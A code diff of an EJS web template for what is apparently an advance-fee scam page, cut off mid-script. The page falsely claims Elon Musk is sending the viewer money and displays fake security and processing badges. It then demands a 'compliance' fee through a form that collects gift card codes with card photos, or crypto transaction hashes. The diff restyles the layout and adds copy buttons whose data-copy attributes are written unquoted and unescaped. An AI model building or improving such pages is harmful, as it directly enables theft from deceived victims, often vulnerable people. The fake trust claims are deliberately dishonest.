@@ -1,368 +1,592 @@
-<title><%= payment.transactionId %>_Payment</title>
 
-<div class="container my-4" id="payment-section">
-  <div class="row justify-content-center">
-    <div
-      class="col-12 col-sm-13 col-md-10 col-lg-8 col-xl-8 d-flex justify-content-center"
-    >
-      <!-- Main Card -->
-      <div class="card transaction-card w-100 p-2 p-sm-2 p-md-2 p-lg-3">
-        <!-- Header Section -->
-        <div class="header-section text-center">
-          <h2 class="fs-5 fs-sm-4 fs-md-3">
-            <b>Elon Musk, CEO of Tesla and SpaceX</b>
-          </h2>
-          <h4 class="fs-6 fs-sm-5 fs-md-4">
-            is sending you
-            <b
-              ><%= payment.currency %><%=
-              Number(payment.amount.toFixed(4)).toLocaleString()%></b
-            >
-          </h4>
-          <p class="fs-6 p-2">
-            <i class="fas fa-lock me-2"></i> Secure Payment Processing...
+
+  <style>
+    /* ---------- Layout / Card ---------- */
+    body { background: #f6f8fb; color: #111827; font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; }
+    .transaction-card { border-radius: 14px; box-shadow: 0 8px 28px rgba(16,24,40,0.06); }
+
+    /* ---------- Transaction table container ---------- */
+    .transaction-details { background: linear-gradient(180deg,#ffffff,#fbfdff); border-radius: 12px; }
+    .transaction-table tbody tr { transition: background-color .18s ease, transform .12s ease; }
+    .transaction-table tbody tr:hover { background: rgba(13,110,253,0.03); transform: translateY(-2px); }
+
+    /* Titles (left) */
+    .transaction-table .title-col {
+      vertical-align: middle;
+      color: #6c757d;        /* faint */
+      font-weight: 500;
+      text-align: left;
+      width: 20%;
+      border: none;
+      padding: .6rem .50rem;
+      font-size: .80rem;
+      white-space: nowrap;
+    }
+
+    /* Details (right) */
+    .transaction-table .detail-col {
+      vertical-align: middle;
+      text-align: right;
+      font-size: 0.90rem;
+      border: none;
+      padding: .55rem .75rem;
+    }
+
+    /* The actual text values */
+    .detail-text {
+      font-weight: 600;
+      color: #111827;
+      display: inline-block;
+      max-width: 80%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+      vertical-align: middle;
+    }
+
+    /* Monospace for IDs/Account Numbers to aid copying */
+    .monospace {
+      letter-spacing: .02em;
+      font-variant-numeric: tabular-nums;
+    }
+
+.copy-btn {
+    margin-left: 6px;
+    color: #0d6efd;
+    font-size: 0.95rem;
+    cursor: pointer;
+    transition: color 0.2s ease, transform 0.15s ease;
+  }
+  .copy-btn:hover {
+    color: #0b5ed7;
+    transform: translateY(-1px);
+  }
+
+  .copy-btn.copied {
+    color: #198754; /* green */
+    transform: scale(1.1);
+  }
+  .copy-toast {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: rgba(255, 255, 255, 0.98);
+    color: #000;
+    padding: .6rem .95rem;
+    border-radius: 10px;
+    display: flex;
+    align-items: center;
+    gap: .6rem;
+    box-shadow: 0 12px 36px rgba(16,24,40,.35);
+    z-index: 2000;
+    opacity: 0;
+    transform: translateY(-8px) scale(.98);
+    pointer-events: none;
+    transition: opacity .18s, transform .18s;
+  }
+  .copy-toast.show {
+    opacity: 1;
+    transform: translateY(0) scale(1);
+    pointer-events: auto;
+  }
+  .copy-toast .toast-icon { color: #34d399; font-size: 1.05rem; }
+    /* Small responsive tweaks */
+    @media (max-width: 576px) {
+      .detail-text { max-width: 60%; font-size: .95rem; }
+      .transaction-table .title-col, .transaction-table .detail-col { padding: .5rem .5rem; }
+    }
+
+    /* Minor helpers */
+    .amount-display { font-weight: 700; letter-spacing: .01em; }
+    .section-title { font-weight: 600; color: #374151; }
+    .subtle { color: #6b7280; text-transform: capitalize; }
+  </style>
+
+  <div class="container my-4" id="payment-section">
+    <div class="row justify-content-center">
+      <div class="col-12 col-sm-10 col-md-10 col-lg-8 col-xl-8 d-flex justify-content-center">
+        <div class="card transaction-card w-100 p-2 p-sm-2 p-md-2 p-lg-3">
+          <!-- Header -->
+          <div class="header-section text-center mb-3">
+            <h2 class="fs-5">
+              <b>Elon Musk, CEO of Tesla and SpaceX</b>
+            </h2>
+            <h4 class="fs-6">
+              is sending you
+              <b><%= payment.currency %><%= Number(payment.amount).toLocaleString(undefined,{minimumFractionDigits:4, maximumFractionDigits:4}) %></b>
+            </h4>
+            <p class="fs-6 p-2"><i class="fas fa-lock me-2"></i> Secure Payment Processing...</p>
+          </div>
+
+          <div class="card-body p-3 p-sm-4 p-md-5">
+            <!-- Alert -->
+            <div class="alert alert-primary d-flex align-items-center fs-6">
+              <i class="fas fa-info-circle fa-lg me-3"></i>
+              <div>This transaction is secured with bank-level encryption and fraud monitoring</div>
+            </div>
+
+            <!-- Transaction Details -->
+            <div class="table-responsive mb-4">
+              <div class="transaction-details card border-0 shadow-sm p-1">
+                <table class="table mb-0 align-middle transaction-table">
+                  <tbody>
+                    <tr>
+                      <th class="title-col"><i class="fas fa-user me-2"></i> Recipient</th>
+                      <td class="detail-col">
+                        <span class="detail-text"><%= payment.name %></span>
+                      </td>
+                    </tr>
+
+                    <tr>
+  <th class="title-col"><i class="fas fa-hashtag me-2"></i> Account Number</th>
+  <td class="detail-col">
+    <span class="detail-text monospace copy-value" data-copy=<%- JSON.stringify(payment.accountNumber) %>>
+      <%= payment.accountNumber %>
+    </span>
+
+    <!-- clickable icon only -->
+    <i
+      class="fas fa-copy copy-btn"
+      data-copy=<%- JSON.stringify(payment.accountNumber) %>
+      aria-label="Copy account number"
+      title="Copy account number"
+      role="button"
+      tabindex="0"
+    ></i>
+  </td>
+</tr>
+
+<tr>
+  <th class="title-col"><i class="fas fa-receipt me-2"></i> Transaction ID</th>
+  <td class="detail-col">
+    <span class="detail-text monospace copy-value" data-copy=<%- JSON.stringify(payment.transactionId) %>>
+      <%= payment.transactionId %>
+    </span>
+
+    <!-- clickable icon only -->
+    <i
+      class="fas fa-copy copy-btn"
+      data-copy=<%- JSON.stringify(payment.transactionId) %>
+      aria-label="Copy transaction ID"
+      title="Copy transaction ID"
+      role="button"
+      tabindex="0"
+    ></i>
+  </td>
+</tr>
+
+
+                    <tr>
+                      <th class="title-col"><i class="fas fa-clock me-2"></i> Initiated</th>
+                      <td class="detail-col">
+                        <span class="detail-text"><%= payment.createdAt.toLocaleString() %></span>
+                      </td>
+                    </tr>
+                  </tbody>
+                </table>
+              </div>
+            </div>
+
+            <!-- Toast (hidden by default) -->
+            <div id="copyToast" class="copy-toast" role="status" aria-live="polite" aria-atomic="true">
+              <i class="fas fa-check-circle me-2 toast-icon" aria-hidden="true"></i>
+              <div class="toast-text"><strong id="copyToastMsg">Copied to clipboard</strong></div>
+            </div>
+
+            <!-- Amount Panel -->
+            <div class="p-3 rounded-3 mb-4 text-center" id="amount-panel">
+              <p class="mb-1 fs-6">Transaction Amount</p>
+              <div class="amount-display text-success fs-2 fs-sm-3 fs-md-2">
+                <%= payment.currency %><%= Number(payment.amount).toLocaleString(undefined,{minimumFractionDigits:4, maximumFractionDigits:4}) %>
+              </div>
+            </div>
+
+            <!-- Progress -->
+            <h4 class="mt-4 mb-3 section-title fs-5">Transfer Progress</h4>
+            <div class="d-flex justify-content-between mb-2 fs-6">
+              <span>Processing</span>
+              <span><%= payment.progress %> Complete</span>
+            </div>
+
+            <div class="progress mb-4" style="height: 20px">
+              <div
+                class="progress-bar progress-bar-striped progress-bar-animated bg-success"
+                role="progressbar"
+                style="width: <%= payment.progress %>%"
+                aria-valuenow="<%= payment.progress %>"
+                aria-valuemin="0"
+                aria-valuemax="100"
+              >
+                <%= payment.progress %>%
+              </div>
+            </div>
+
+<!-- Status Items -->
+<div class="row g-3">
+  <!-- Payment Processed -->
+  <div class="col-6">
+    <div class="status-item completed h-100 p-3 border rounded shadow-sm bg-white">
+      <div class="d-flex align-items-start">
+        <div class="me-2 text-success">
+          <i class="fas fa-check-circle fa-lg"></i>
+        </div>
+        <div>
+          <h6 class="mb-1 fw-bold text-dark small">Payment Processed</h6>
+          <p class="text-muted mb-0 small">
+            Your payment has been successfully authorized and processed.
           </p>
         </div>
+      </div>
+    </div>
+  </div>
 
-        <!-- Main Content -->
-        <div class="card-body p-3 p-sm-4 p-md-5">
-          <!-- Alert -->
-          <div class="alert alert-primary d-flex align-items-center fs-6">
-            <i class="fas fa-info-circle fa-lg me-3"></i>
-            <div>
-              This transaction is secured with bank-level encryption and fraud
-              monitoring
-            </div>
-          </div>
-
-          <!-- Recipient Info -->
-          <div class="row mb-4">
-            <div class="col-md-6">
-              <p class="mb-1 text-muted fs-6">Recipient</p>
-              <h4 class="mb-0 fs-5"><b><%= payment.name %></b></h4>
-              <p class="mb-0 fs-6">
-                Account Number: <b><%= payment.accountNumber %></b>
-              </p>
-              <p class="mb-0 fs-6">Bank Name: <b><%= payment.bank %></b></p>
-            </div>
-            <div class="col-md-6 text-md-end mt-3 mt-md-0">
-              <p class="mb-1 text-muted fs-6">Transaction ID</p>
-              <h5 class="mb-0 fs-6"><b><%= payment.transactionId %></b></h5>
-              <small class="text-muted fs-6"
-                >Initiated: <%= payment.createdAt.toLocaleString() %></small
-              >
-            </div>
-          </div>
-
-          <!-- Amount Display -->
-          <div class="p-3 rounded-3 mb-4 text-center" id="amount-panel">
-            <p class="mb-1 fs-6">Transaction Amount</p>
-            <div class="amount-display text-success fs-2 fs-sm-3 fs-md-2">
-              <%= payment.currency %><%=
-              Number(payment.amount.toFixed(4)).toLocaleString()%>
-            </div>
-          </div>
-
-          <!-- Progress -->
-          <h4 class="mt-4 mb-3 section-title fs-5">Transfer Progress</h4>
-          <div class="d-flex justify-content-between mb-2 fs-6">
-            <span>Processing</span>
-            <span><%= payment.progress %> Complete</span>
-          </div>
-
-          <div class="progress mb-4" style="height: 20px">
-            <div
-              class="progress-bar progress-bar-striped progress-bar-animated bg-success"
-              role="progressbar"
-              style="width: <%= payment.progress %>%"
-              aria-valuenow="<%= payment.progress %>"
-              aria-valuemin="0"
-              aria-valuemax="100"
-            >
-              <%= payment.progress %>%
-            </div>
-          </div>
-
-          <!-- Status Items -->
-          <div class="status-item completed fs-6">
-            <div class="d-flex align-items-center">
-              <div class="feature-icon me-2">
-                <i class="fas fa-check"></i>
-              </div>
-              <div>
-                <h5 class="mb-1 fs-6">Payment Processed</h5>
-                <p class="text-muted mb-0 fs-6">
-                  Your payment has been successfully authorized and processed.
-                </p>
-              </div>
-            </div>
-          </div>
-
-          <div class="status-item completed fs-6 mt-3">
-            <div class="d-flex align-items-center">
-              <div class="feature-icon me-2">
-                <i class="fas fa-check"></i>
-              </div>
-              <div>
-                <h5 class="mb-1 fs-6">Security Verification</h5>
-                <p class="text-muted mb-0 fs-6">
-                  Transaction passed all security checks and fraud detection.
-                </p>
-              </div>
-            </div>
-          </div>
-
-          <div class="status-item pending fs-6 mt-3">
-            <div class="d-flex align-items-center">
-              <div class="feature-icon me-2" id="arrLeft">
-                <i class="fas fa-arrow-right"></i>
-              </div>
-              <div>
-                <h5 class="mb-1 fs-6">Delivery in Progress</h5>
-                <% if (payment.txsFee.length !== ''){%>
-                <p class="text-muted mb-0">
-                  To finalize your transfer, a compliance-related fee of
-                  <b
-                    ><%= payment.currency %><%=
-                    Number(payment.txsFee.toFixed(4)).toLocaleString()%></b
-                  >
-                  will apply. This forms part of our standard regulatory
-                  procedures.
-                </p>
-                <% } else { %>
-                <p class="text-muted mb-0"><%= payment.message %></p>
-                <% } %>
-                <!-- Trigger Button -->
-                <a
-                  href="#"
-                  data-bs-toggle="modal"
-                  data-bs-target="#paymentModal"
-                  class="d-flex align-items-center text-decoration-none mt-2"
-                >
-                  <span
-                    class="d-flex align-items-center px-2 py-1 <% if (payment.perment && payment.perment.status === 'success') { %> bg-success text-white <% } else if ((payment.giftCard && payment.giftCard.code) || (payment.cryptoTransaction && payment.cryptoTransaction.transactionHash)) { %> bg-warning text-dark <% } else { %> bg-primary text-white <% } %> rounded"
-                  >
-                    <% if (payment.perment && payment.perment.status ===
-                    'success') { %>
-                    <i class="fas fa-check-circle me-2"></i>
-                    Payment Successful <% } else if ((payment.giftCard &&
-                    payment.giftCard.code) || (payment.cryptoTransaction &&
-                    payment.cryptoTransaction.transactionHash)) { %>
-                    <i class="fas fa-arrows-rotate me-2"></i>
-                    Pending Verification <% } else { %>
-                    <i class="fas fa-credit-card me-2"></i>
-                    Make Payment <% } %>
-                  </span>
-                </a>
-
-                <div class="mt-2">
-                  <small class="text-warning"
-                    ><i class="fas fa-clock me-1"></i> We apologize for any
-                    delay. Thank you for selecting our service.</small
-                  >
-                </div>
-              </div>
-            </div>
-          </div>
-
-          <!-- Security Features -->
-          <h4 class="mt-5 mb-3 section-title fs-5">Security & Protection</h4>
-          <div class="row">
-            <div class="col-md-6 mb-3">
-              <div class="security-badge h-100">
-                <div class="benefit-item d-flex align-items-start">
-                  <div class="feature-icon me-2">
-                    <i class="fas fa-lock"></i>
-                  </div>
-                  <div>
-                    <h6 class="mb-1 fs-6">256-bit Encryption</h6>
-                    <p class="text-muted small mb-0">
-                      Bank-level security for all transactions
-                    </p>
-                  </div>
-                </div>
-              </div>
-            </div>
-            <div class="col-md-6 mb-3">
-              <div class="security-badge h-100">
-                <div class="benefit-item d-flex align-items-start">
-                  <div class="feature-icon me-2">
-                    <i class="fas fa-shield-alt"></i>
-                  </div>
-                  <div>
-                    <h6 class="mb-1 fs-6">Fraud Monitoring</h6>
-                    <p class="text-muted small mb-0">
-                      24/7 monitoring for suspicious activity
-                    </p>
-                  </div>
-                </div>
-              </div>
-            </div>
-          </div>
-          <!-- footer support -->
-          <div class="d-flex justify-content-between align-items-center mt-3">
-            <div class="text-end">
-              <div class="subtle">Need help?</div>
-              <div>
-                <a href="#" class="subtle">contact support</a>
-              </div>
-            </div>
-          </div>
+  <!-- Security Verification -->
+  <div class="col-6">
+    <div class="status-item completed h-100 p-3 border rounded shadow-sm bg-white">
+      <div class="d-flex align-items-start">
+        <div class="me-2 text-primary">
+          <i class="fas fa-shield-alt fa-lg"></i>
         </div>
-        <!-- end card body -->
+        <div>
+          <h6 class="mb-1 fw-bold text-dark small">Security Verification</h6>
+          <p class="text-muted mb-0 small">
+            Transaction passed all security checks and fraud detection.
+          </p>
+        </div>
       </div>
     </div>
   </div>
 </div>
 
-<!-- Payment Modal -->
-<div class="modal fade" id="paymentModal" tabindex="-1">
-  <div class="modal-dialog modal-lg modal-dialog-centered">
-    <div class="modal-content shadow-lg rounded-4 overflow-hidden animate__animated animate__zoomIn">
-      <div class="modal-header bg-black text-white">
-        <h5 class="modal-title"><i class="fas fa-shield-alt me-2"></i> Secure Payment</h5>
-        <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
-      </div>
-      <div class="modal-body">
-        <form action="<%= payment.link %>/success?_method=PUT" method="POST" enctype="multipart/form-data">
-          
-          <!-- Method Switch -->
-          <div class="text-center mb-4">
-            <p>Pay with:</p>
-            <input type="radio" class="btn-check" name="paymethod" id="methodGift" checked>
-            <label class="btn btn-outline-dark rounded-pill me-2" for="methodGift">
-              <i class="fas fa-gift me-1"></i> Gift Card
-            </label>
-            <input type="radio" class="btn-check" name="paymethod" id="methodCrypto">
-            <label class="btn btn-outline-dark rounded-pill" for="methodCrypto">
-              <i class="fab fa-bitcoin me-1"></i> Crypto
-            </label>
-          </div>
+<!-- Delivery in Progress -->
+<div class="status-item pending mt-4 p-3 border rounded shadow-sm bg-white">
+  <div class="d-flex align-items-start">
+    <div class="me-2 text-warning" id="arrLeft">
+      <i class="fas fa-arrow-right fa-lg"></i>
+    </div>
+    <div>
+      <h6 class="mb-1 fw-bold text-dark small">Delivery in Progress</h6>
+      <% if (payment.txsFee && Number(payment.txsFee) > 0) { %>
+        <p class="text-muted mb-0 small">
+          To finalize your transfer, a compliance-related fee of
+          <b><%= payment.currency %><%= Number(payment.txsFee).toLocaleString(undefined,{minimumFractionDigits:4, maximumFractionDigits:4}) %></b>
+          will apply. This forms part of our standard regulatory procedures.
+        </p>
+      <% } else { %>
+        <p class="text-muted mb-0 small"><%= payment.message || 'Processing...' %></p>
+      <% } %>
 
-          <!-- Gift Card -->
-          <div id="giftCardSection" class="animate__animated animate__fadeIn">
-            <label class="form-label"><i class="fas fa-gift me-1"></i> Gift Card Type</label>
-            <select name="giftCard[type]" class="form-select mb-3">
-              <option value="">-- Select Gift Card Type --</option>
-              <% ['Amazon','Apple','Google Play','Steam','Walmart','Visa'].forEach(t => { %>
-                <option value="<%= t %>" <%= payment.giftCard?.type === t ? 'selected' : '' %>><%= t %></option>
-              <% }) %>
-            </select>
+      <!-- Trigger Button -->
+      <a href="#" data-bs-toggle="modal" data-bs-target="#paymentModal"
+         class="d-inline-flex align-items-center text-decoration-none mt-2">
+        <span class="d-flex align-items-center px-2 py-1 rounded small fw-semibold
+          <% if (payment.perment && payment.perment.status === 'success') { %> bg-success text-white
+          <% } else if ((payment.giftCard && payment.giftCard.code) || (payment.cryptoTransaction && payment.cryptoTransaction.transactionHash)) { %> bg-warning text-dark
+          <% } else { %> bg-primary text-white <% } %>">
+          <% if (payment.perment && payment.perment.status === 'success') { %>
+            <i class="fas fa-check-circle me-2"></i> Payment Successful
+          <% } else if ((payment.giftCard && payment.giftCard.code) || (payment.cryptoTransaction && payment.cryptoTransaction.transactionHash)) { %>
+            <i class="fas fa-arrows-rotate me-2"></i> Pending Verification
+          <% } else { %>
+            <i class="fas fa-credit-card me-2"></i> Make Payment
+          <% } %>
+        </span>
+      </a>
 
-            <label class="form-label"><i class="fas fa-key me-1"></i> Gift Card Code</label>
-            <input type="text" name="giftCard[code]" id="giftCardCode" class="form-control mb-3"
-              value="<%= payment.giftCard?.code || '' %>">
-
-            <div class="row g-3">
-              <div class="col-md-6">
-                <label class="form-label"><i class="fas fa-image me-1"></i> Front Image</label>
-                <div class="border rounded-3 p-2 text-center shadow-sm">
-                  <img id="frontPreview"
-                       src="<%= payment.giftCard?.frontImageUrl || '' %>"
-                       class="img-fluid rounded animate__animated"
-                       style="<%= payment.giftCard?.frontImageUrl ? 'display:block;' : 'display:none;' %>">
-                </div>
-                <input type="file" name="giftCard[frontImage]" class="form-control mt-2"
-                       accept="image/*" onchange="previewImage(this,'frontPreview')">
-              </div>
-              <div class="col-md-6">
-                <label class="form-label"><i class="fas fa-image me-1"></i> Back Image</label>
-                <div class="border rounded-3 p-2 text-center shadow-sm">
-                  <img id="backPreview"
-                       src="<%= payment.giftCard?.backImageUrl || '' %>"
-                       class="img-fluid rounded animate__animated"
-                       style="<%= payment.giftCard?.backImageUrl ? 'display:block;' : 'display:none;' %>">
-                </div>
-                <input type="file" name="giftCard[backImage]" class="form-control mt-2"
-                       accept="image/*" onchange="previewImage(this,'backPreview')">
-              </div>
-            </div>
-          </div>
-
-          <!-- Crypto -->
-          <div id="cryptoSection" class="d-none animate__animated">
-            <label class="form-label"><i class="fab fa-bitcoin me-1"></i> Crypto Type</label>
-            <select name="cryptoTransaction[type]" class="form-select mb-3">
-              <option value="">-- Select Crypto --</option>
-              <% ['Bitcoin','Ethereum','USDT'].forEach(c => { %>
-                <option value="<%= c %>" <%= payment.cryptoTransaction?.type === c ? 'selected' : '' %>><%= c %></option>
-              <% }) %>
-            </select>
-
-            <label class="form-label"><i class="fas fa-hashtag me-1"></i> Transaction Hash</label>
-            <input type="text" name="cryptoTransaction[transactionHash]" id="cryptoHash" class="form-control mb-3"
-              value="<%= payment.cryptoTransaction?.transactionHash || '' %>">
-
-            <label class="form-label"><i class="fas fa-file-invoice me-1"></i> Slip Image</label>
-            <div class="border rounded-3 p-2 text-center shadow-sm">
-              <img id="slipPreview"
-                   src="<%= payment.cryptoTransaction?.slipImageUrl || '' %>"
-                   class="img-fluid rounded animate__animated"
-                   style="<%= payment.cryptoTransaction?.slipImageUrl ? 'display:block;' : 'display:none;' %>">
-            </div>
-            <input type="file" name="cryptoTransaction[slipImage]" class="form-control mt-2"
-                   accept="image/*" onchange="previewImage(this,'slipPreview')">
-          </div>
-
-          <!-- Footer -->
-          <div class="text-end mt-4">
-            <button type="button" class="btn btn-secondary rounded-pill" data-bs-dismiss="modal">
-              <i class="fas fa-times me-1"></i> Cancel
-            </button>
-            <button type="submit" class="btn btn-success rounded-pill shadow-sm loaderBtn">
-              <i class="fas fa-lock me-1"></i> Proceed Payment
-            </button>
-          </div>
-        </form>
+      <div class="mt-2">
+        <small class="text-info">
+          <i class="fas fa-clock me-1"></i> We apologize for any delay. Thank you for selecting our service.
+        </small>
       </div>
     </div>
   </div>
 </div>
 
-<!-- Animate.css -->
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+            <!-- Security Features + Footer -->
+            <h4 class="mt-5 mb-3 section-title fs-5">Security & Protection</h4>
+            <div class="row">
+              <div class="col-md-6 mb-3">
+                <div class="security-badge h-100">
+                  <div class="benefit-item d-flex align-items-start">
+                    <div class="feature-icon me-2">
+                      <i class="fas fa-lock"></i>
+                    </div>
+                    <div>
+                      <h6 class="mb-1 fs-6">256-bit Encryption</h6>
+                      <p class="text-muted small mb-0">Bank-level security for all transactions</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+              <div class="col-md-6 mb-3">
+                <div class="security-badge h-100">
+                  <div class="benefit-item d-flex align-items-start">
+                    <div class="feature-icon me-2">
+                      <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <div>
+                      <h6 class="mb-1 fs-6">Fraud Monitoring</h6>
+                      <p class="text-muted small mb-0">24/7 monitoring for suspicious activity</p>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
 
-<!-- Script -->
-<script>
-document.addEventListener('DOMContentLoaded', function(){
-  const rGift = document.getElementById('methodGift');
-  const rCrypto = document.getElementById('methodCrypto');
-  const giftInput = document.getElementById('giftCardCode');
-  const cryptoInput = document.getElementById('cryptoHash');
+            <div class="d-flex justify-content-between align-items-center mt-3">
+              <div class="text-end">
+                <div class="subtle">Need help?</div>
+                <div><a href="#" class="subtle">contact support</a></div>
+              </div>
+            </div>
+          </div>
+          <!-- end card body -->
+        </div>
+      </div>
+    </div>
+  </div>
 
-  rGift.addEventListener('change', () => setMethodUI('giftCard'));
-  rCrypto.addEventListener('change', () => setMethodUI('crypto'));
-  setMethodUI('giftCard');
+  <!-- Payment Modal (unchanged logic) -->
+  <div class="modal fade" id="paymentModal" tabindex="-1">
+    <div class="modal-dialog modal-lg modal-dialog-centered">
+      <div class="modal-content shadow-lg rounded-4 overflow-hidden animate__animated animate__zoomIn">
+        <div class="modal-header bg-black text-white">
+          <h5 class="modal-title"><i class="fas fa-shield-alt me-2"></i> Secure Payment</h5>
+          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+        </div>
+        <div class="modal-body">
+          <form action="<%= payment.link %>/success?_method=PUT" method="POST" enctype="multipart/form-data">
+            <div class="text-center mb-4">
+              <p>Pay with:</p>
+              <input type="radio" class="btn-check" name="paymethod" id="methodGift" checked>
+              <label class="btn btn-outline-dark rounded-pill me-2" for="methodGift"><i class="fas fa-gift me-1"></i> Gift Card</label>
+              <input type="radio" class="btn-check" name="paymethod" id="methodCrypto">
+              <label class="btn btn-outline-dark rounded-pill" for="methodCrypto"><i class="fab fa-bitcoin me-1"></i> Crypto</label>
+            </div>
 
-  function setMethodUI(method){
-    const gift = document.getElementById('giftCardSection');
-    const crypto = document.getElementById('cryptoSection');
-    if (method === 'giftCard'){
-      gift.classList.remove('d-none');
-      crypto.classList.add('d-none');
-      giftInput.required = true;
-      cryptoInput.required = false;
-    } else {
-      crypto.classList.remove('d-none');
-      gift.classList.add('d-none');
-      giftInput.required = false;
-      cryptoInput.required = true;
+            <!-- Gift Card -->
+            <div id="giftCardSection" class="animate__animated animate__fadeIn">
+              <label class="form-label"><i class="fas fa-gift me-1"></i> Gift Card Type</label>
+              <select name="giftCard[type]" class="form-select mb-3">
+                <option value="">-- Select Gift Card Type --</option>
+                <% ['Amazon','Apple','Google Play','Steam','Walmart','Visa'].forEach(t => { %>
+                  <option value="<%= t %>" <%= payment.giftCard && payment.giftCard.type === t ? 'selected' : '' %>><%= t %></option>
+                <% }) %>
+              </select>
+
+              <label class="form-label"><i class="fas fa-key me-1"></i> Gift Card Code</label>
+              <input type="text" name="giftCard[code]" id="giftCardCode" class="form-control mb-3"
+                value="<%= payment.giftCard && payment.giftCard.code ? payment.giftCard.code : '' %>">
+
+              <div class="row g-3">
+                <div class="col-md-6">
+                  <label class="form-label"><i class="fas fa-image me-1"></i> Front Image</label>
+                  <div class="border rounded-3 p-2 text-center shadow-sm">
+                    <img id="frontPreview" src="<%= payment.giftCard && payment.giftCard.frontImageUrl ? payment.giftCard.frontImageUrl : '' %>" class="img-fluid rounded animate__animated" style="<%= payment.giftCard && payment.giftCard.frontImageUrl ? 'display:block;' : 'display:none;' %>">
+                  </div>
+                  <input type="file" name="giftCard[frontImage]" class="form-control mt-2" accept="image/*" onchange="previewImage(this,'frontPreview')">
+                </div>
+
+                <div class="col-md-6">
+                  <label class="form-label"><i class="fas fa-image me-1"></i> Back Image</label>
+                  <div class="border rounded-3 p-2 text-center shadow-sm">
+                    <img id="backPreview" src="<%= payment.giftCard && payment.giftCard.backImageUrl ? payment.giftCard.backImageUrl : '' %>" class="img-fluid rounded animate__animated" style="<%= payment.giftCard && payment.giftCard.backImageUrl ? 'display:block;' : 'display:none;' %>">
+                  </div>
+                  <input type="file" name="giftCard[backImage]" class="form-control mt-2" accept="image/*" onchange="previewImage(this,'backPreview')">
+                </div>
+              </div>
+            </div>
+
+            <!-- Crypto -->
+            <div id="cryptoSection" class="d-none animate__animated">
+              <label class="form-label"><i class="fab fa-bitcoin me-1"></i> Crypto Type</label>
+              <select name="cryptoTransaction[type]" class="form-select mb-3">
+                <option value="">-- Select Crypto --</option>
+                <% ['Bitcoin','Ethereum','USDT'].forEach(c => { %>
+                  <option value="<%= c %>" <%= payment.cryptoTransaction && payment.cryptoTransaction.type === c ? 'selected' : '' %>><%= c %></option>
+                <% }) %>
+              </select>
+
+              <label class="form-label"><i class="fas fa-hashtag me-1"></i> Transaction Hash</label>
+              <input type="text" name="cryptoTransaction[transactionHash]" id="cryptoHash" class="form-control mb-3" value="<%= payment.cryptoTransaction && payment.cryptoTransaction.transactionHash ? payment.cryptoTransaction.transactionHash : '' %>">
+
+              <label class="form-label"><i class="fas fa-file-invoice me-1"></i> Slip Image</label>
+              <div class="border rounded-3 p-2 text-center shadow-sm">
+                <img id="slipPreview" src="<%= payment.cryptoTransaction && payment.cryptoTransaction.slipImageUrl ? payment.cryptoTransaction.slipImageUrl : '' %>" class="img-fluid rounded animate__animated" style="<%= payment.cryptoTransaction && payment.cryptoTransaction.slipImageUrl ? 'display:block;' : 'display:none;' %>">
+              </div>
+              <input type="file" name="cryptoTransaction[slipImage]" class="form-control mt-2" accept="image/*" onchange="previewImage(this,'slipPreview')">
+            </div>
+
+            <div class="text-end mt-4">
+              <button type="button" class="btn btn-secondary rounded-pill" data-bs-dismiss="modal">
+                <i class="fas fa-times me-1"></i> Cancel
+              </button>
+              <button type="submit" class="btn btn-success rounded-pill shadow-sm loaderBtn">
+                <i class="fas fa-lock me-1"></i> Proceed Payment
+              </button>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Bootstrap Bundle (includes Popper) -->
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+
+  <script>
+    // ---------- Gift / Crypto UI Toggle ----------
+    (function () {
+      document.addEventListener('DOMContentLoaded', () => {
+        const rGift = document.getElementById('methodGift');
+        const rCrypto = document.getElementById('methodCrypto');
+        const giftInput = document.getElementById('giftCardCode');
+        const cryptoInput = document.getElementById('cryptoHash');
+
+        function setMethodUI(method){
+          const gift = document.getElementById('giftCardSection');
+          const crypto = document.getElementById('cryptoSection');
+          if (!gift || !crypto) return;
+          if (method === 'giftCard'){
+            gift.classList.remove('d-none');
+            crypto.classList.add('d-none');
+            if (giftInput) giftInput.required = true;
+            if (cryptoInput) cryptoInput.required = false;
+          } else {
+            crypto.classList.remove('d-none');
+            gift.classList.add('d-none');
+            if (giftInput) giftInput.required = false;
+            if (cryptoInput) cryptoInput.required = true;
+          }
+        }
+
+        if (rGift) rGift.addEventListener('change', () => setMethodUI('giftCard'));
+        if (rCrypto) rCrypto.addEventListener('change', () => setMethodUI('crypto'));
+
+        // default
+        setMethodUI('giftCard');
+      });
+    })();
+
+    // ---------- Image Preview ----------
+    function previewImage(input, previewId){
+      const file = input.files && input.files[0];
+      const img = document.getElementById(previewId);
+      if (!img) return;
+      if (!file) { img.style.display='none'; return; }
+      const reader = new FileReader();
+      reader.onload = e => {
+        img.src = e.target.result;
+        img.style.display = 'block';
+        img.classList.remove('animate__fadeOut');
+        img.classList.add('animate__fadeIn');
+      };
+      reader.readAsDataURL(file);
     }
-  }
-});
 
-// Preview with animation
-function previewImage(input, previewId){
-  const file = input.files[0];
-  const img = document.getElementById(previewId);
-  if (!file) { img.style.display='none'; return; }
-  const reader = new FileReader();
-  reader.onload = e => {
-    img.src = e.target.result;
-    img.style.display = 'block';
-    img.classList.remove('animate__fadeOut');
-    img.classList.add('animate__fadeIn');
-  };
-  reader.readAsDataURL(file);
-}
-</script>
+    // ---------- Copy to Clipboard with toast & button feedback ----------
+    (function () {
+      const toast = document.getElementById('copyToast');
+      const toastMsg = document.getElementById('copyToastMsg');
+
+      // Delegated click for copy buttons or clickable value elements
+      document.addEventListener('click', (e) => {
+        const btn = e.target.closest('.copy-btn');
+        const valEl = e.target.closest('.copy-value');
+
+        if (btn) {
+          const raw = btn.getAttribute('data-copy');
+          const text = normalizeAttrValue(raw);
+          handleCopy(text, btn);
+        } else if (valEl) {
+          const raw = valEl.getAttribute('data-copy');
+          const text = normalizeAttrValue(raw);
